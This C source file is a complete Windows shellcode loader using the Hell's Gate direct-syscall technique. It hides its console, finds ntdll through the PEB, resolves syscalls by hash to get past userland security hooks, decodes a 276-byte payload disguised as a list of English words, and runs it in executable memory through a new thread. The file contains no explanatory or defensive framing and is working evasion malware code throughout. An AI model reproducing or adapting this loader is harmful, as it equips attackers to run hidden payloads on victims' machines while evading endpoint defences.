#pragma once
#include <Windows.h>
#include "structs.h"

/*--------------------------------------------------------------------
  VX Tables
--------------------------------------------------------------------*/
typedef struct _VX_TABLE_ENTRY {
	PVOID   pAddress;
	DWORD64 dwHash;
	WORD    wSystemCall;
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;

typedef struct _VX_TABLE {
	VX_TABLE_ENTRY NtAllocateVirtualMemory;
	VX_TABLE_ENTRY NtProtectVirtualMemory;
	VX_TABLE_ENTRY NtCreateThreadEx;
	VX_TABLE_ENTRY NtWaitForSingleObject;
} VX_TABLE, * PVX_TABLE;

/*--------------------------------------------------------------------
  Function prototypes.
--------------------------------------------------------------------*/
PTEB RtlGetThreadEnvironmentBlock();
BOOL GetImageExportDirectory(
	_In_ PVOID                     pModuleBase,
	_Out_ PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory
);
BOOL GetVxTableEntry(
	_In_ PVOID pModuleBase,
	_In_ PIMAGE_EXPORT_DIRECTORY pImageExportDirectory,
	_In_ PVX_TABLE_ENTRY pVxTableEntry
);
BOOL Payload(
	_In_ PVX_TABLE pVxTable
);
PVOID VxMoveMemory(
	_Inout_ PVOID dest,
	_In_    const PVOID src,
	_In_    SIZE_T len
);

/*--------------------------------------------------------------------
  External functions' prototype.
--------------------------------------------------------------------*/
extern VOID HellsGate(WORD wSystemCall);
extern HellDescent();

INT wmain() {
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	//FreeConsole();
	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
		return 0x1;

	// Get NTDLL module 
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

	// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return 0x01;

	VX_TABLE Table = { 0 };
	Table.NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89b;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtAllocateVirtualMemory))
		return 0x1;

	Table.NtCreateThreadEx.dwHash = 0x64dc7db288c5015f;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtCreateThreadEx))
		return 0x1;

	Table.NtProtectVirtualMemory.dwHash = 0x858bcb1046fb6a37;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtProtectVirtualMemory))
		return 0x1;

	Table.NtWaitForSingleObject.dwHash = 0xc6a2fa174e551bcb;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtWaitForSingleObject))
		return 0x1;

	Payload(&Table);
	return 0x00;
}

PTEB RtlGetThreadEnvironmentBlock() {
#if _WIN64
	return (PTEB)__readgsqword(0x30);
#else
	return (PTEB)__readfsdword(0x16);
#endif
}

DWORD64 djb2(PBYTE str) {
	DWORD64 dwHash = 0x7734773477347734;
	INT c;

	while (c = *str++)
		dwHash = ((dwHash << 0x5) + dwHash) + c;

	return dwHash;
}

BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
	// Get DOS header
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	// Get NT headers
	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	// Get the EAT
	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
}

BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (djb2(pczFunctionName) == pVxTableEntry->dwHash) {
			pVxTableEntry->pAddress = pFunctionAddress;

			// Quick and dirty fix in case the function has been hooked
			WORD cw = 0;
			while (TRUE) {
				// check if syscall, in this case we are too far
				if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
					return FALSE;

				// check if ret, in this case we are also probaly too far
				if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
					return FALSE;

				// First opcodes should be :
				//    MOV R10, RCX
				//    MOV RCX, <syscall>
				if (*((PBYTE)pFunctionAddress + cw) == 0x4c
					&& *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
					&& *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
					&& *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
					&& *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
					&& *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
					BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
					BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
					pVxTableEntry->wSystemCall = (high << 8) | low;
					break;
				}

				cw++;
			};
		}
	}

	return TRUE;
}
const char* translate_dict[256] = { "modes","exempt","books","bristol","vertex","estate","potter","birth","attend","prepare","liked","windsor","andale","sales","shirt","suspect","lloyd","visitors","netscape","media","victor","lingerie","always","machine","truck","artwork","teaches","eagle","granted","eight","project","ranch","bacon","nicole","overcome","retired","sally","electric","flyer","podcasts","bidding","error","fairy","noticed","waiver","fears","cooper","bridal","wilson","animals","delaware","beings","blogging","fraction","question","losing","kuwait","oriental","rounds","pointer","robbie","meetings","bernard","charm","airplane","causes","stayed","rolling","homeland","filename","trains","suffer","sample","illegal","basement","vsnet","holly","scale","cities","bored","directed","cliff","party","harbor","status","ensure","audio","seating","roberts","notes","kenny","lately","philip","coast","envelope","blood","virtual","sentence","counts","queens","views","bubble","learn","wearing","mental","adult","member","amazing","outlet","consent","proposal","scottish","french","photo","train","chaos","filme","arrested","children","fight","terrible","thanks","vitamin","ethnic","possess","saint","premier","boundary","colorado","having","indians","injured","lawyers","archive","photos","tribal","scoring","asset","marriage","houses","isolated","although","weapons","property","duties","bowling","drink","vehicle","divorce","leisure","olympic","covers","travels","cartoon","spears","ireland","outline","honduras","employed","prefix","letters","chapters","square","earnings","nasty","forum","birds","surgeons","deserve","licking","costs","escape","webcast","greeting","later","shipped","rolls","slovak","playback","potatoes","vertical","positive","cannon","lesbians","guess","shadow","guide","dresses","embedded","plane","soonest","plastics","federal","aside","anderson","slots","junior","estimate","activity","manage","prostate","filter","rebound","booth","follows","scanned","armed","witch","origin","hindu","global","trials","foods","perth","antonio","bikini","washer","alone","exports","delivers","stood","boating","planets","fantasy","triangle","truly","bedford","daisy","seconds","pills","machines","instant","fired","resulted","concert","tribute","drawn","jewelry","songs","fatal","listings","gordon","hundreds","papua","familiar","dollar","speakers","billion","shopper","elvis","afford","right","danger","sunrise","remove","prophet" };
#define SHELLCODE_LENGTH 276
const char* dict_words[SHELLCODE_LENGTH] = { "danger", "sample", "injured", "seconds", "listings", "fired", "federal", "modes", "modes", "modes", "causes", "cliff", "causes", "directed", "party", "cliff", "audio", "sample", "animals", "global", "bubble", "sample", "houses", "party", "virtual", "sample", "houses", "party", "truck", "sample", "houses", "party", "bacon", "sample", "houses", "train", "directed", "sample", "suspect", "lesbians", "basement", "basement", "scale", "animals", "filter", "sample", "animals", "federal", "webcast", "robbie", "sentence", "possess", "books", "waiver", "bacon", "causes", "aside", "filter", "sales", "causes", "exempt", "aside", "bedford", "jewelry", "party", "causes", "cliff", "sample", "houses", "party", "bacon", "houses", "stayed", "robbie", "sample", "exempt", "origin", "houses", "colorado", "scoring", "modes", "modes", "modes", "sample", "archive", "federal", "filme", "wearing", "sample", "exempt", "origin", "directed", "houses", "sample", "truck", "homeland", "houses", "airplane", "bacon", "illegal", "exempt", "origin", "daisy", "audio", "sample", "prophet", "filter", "causes", "houses", "blogging", "scoring", "sample", "exempt", "antonio", "scale", "animals", "filter", "sample", "animals", "federal", "webcast", "causes", "aside", "filter", "sales", "causes", "exempt", "aside", "kuwait", "triangle", "arrested", "gordon", "holly", "bristol", "holly", "sally", "attend", "filename", "oriental", "hindu", "arrested", "washer", "roberts", "homeland", "houses", "airplane", "sally", "illegal", "exempt", "origin", "learn", "causes", "houses", "andale", "sample", "homeland", "houses", "airplane", "granted", "illegal", "exempt", "origin", "causes", "houses", "vertex", "scoring", "sample", "exempt", "origin", "causes", "roberts", "causes", "roberts", "envelope", "notes", "kenny", "causes", "roberts", "causes", "notes", "causes", "kenny", "sample", "injured", "drawn", "bacon", "causes", "party", "prophet", "triangle", "roberts", "causes", "notes", "kenny", "sample", "houses", "netscape", "resulted", "seating", "prophet", "prophet", "prophet", "coast", "sample", "guide", "exempt", "modes", "modes", "modes", "modes", "modes", "modes", "modes", "sample", "although", "although", "exempt", "exempt", "modes", "modes", "causes", "guide", "animals", "houses", "scottish", "tribal", "prophet", "perth", "dresses", "triangle", "eight", "fairy", "liked", "causes", "guide", "birds", "leisure", "plane", "honduras", "prophet", "perth", "sample", "injured", "junior", "bidding", "robbie", "potter", "possess", "liked", "colorado", "right", "triangle", "arrested", "estate", "dresses", "suffer", "media", "train", "scottish", "member", "modes", "notes", "causes", "asset", "exports", "prophet", "perth", "queens", "sentence", "outlet", "queens", "cooper", "bubble", "terrible", "bubble", "modes" };


BOOL Payload(PVX_TABLE pVxTable) {
	NTSTATUS status = 0x00000000;
	char shellcode[SHELLCODE_LENGTH];
	SIZE_T sDataSize = sizeof(shellcode);

	// Decode shellcode using input Dictionary wordlist "translate_dict"
	for (int sc_index = 0; sc_index < SHELLCODE_LENGTH; sc_index++) {
		for (int dict_index = 0; dict_index < 256; dict_index++) {
			if (strcmp(translate_dict[dict_index], dict_words[sc_index]) == 0) {
				shellcode[sc_index] = dict_index;
				break;
			}
		}
	}

	// Allocate memory for the shellcode
	PVOID lpAddress = NULL;
	HellsGate(pVxTable->NtAllocateVirtualMemory.wSystemCall);
	status = HellDescent((HANDLE)-1, &lpAddress, 0, &sDataSize, MEM_COMMIT, PAGE_READWRITE);

	// Write Memory
	VxMoveMemory(lpAddress, shellcode, sizeof(shellcode));

	// Change page permissions
	ULONG ulOldProtect = 0;
	HellsGate(pVxTable->NtProtectVirtualMemory.wSystemCall);
	status = HellDescent((HANDLE)-1, &lpAddress, &sDataSize, PAGE_EXECUTE_READ, &ulOldProtect);

	// Create thread
	HANDLE hHostThread = INVALID_HANDLE_VALUE;
	HellsGate(pVxTable->NtCreateThreadEx.wSystemCall);
	status = HellDescent(&hHostThread, 0x1FFFFF, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL);

	WaitForSingleObject(hHostThread, INFINITE);
	// Wait for 1 seconds
	//LARGE_INTEGER Timeout;
	//Timeout.QuadPart = -10000000;
	//Timeout = INFINITE;
	//HellsGate(pVxTable->NtWaitForSingleObject.wSystemCall);
	//status = HellDescent(hHostThread, FALSE, &Timeout);

	return TRUE;
}

PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len) {
	char* d = dest;
	const char* s = src;
	if (d < s)
		while (len--)
			*d++ = *s++;
	else {
		char* lasts = s + (len - 1);
		char* lastd = d + (len - 1);
		while (len--)
			*lastd-- = *lasts--;
	}
	return dest;
}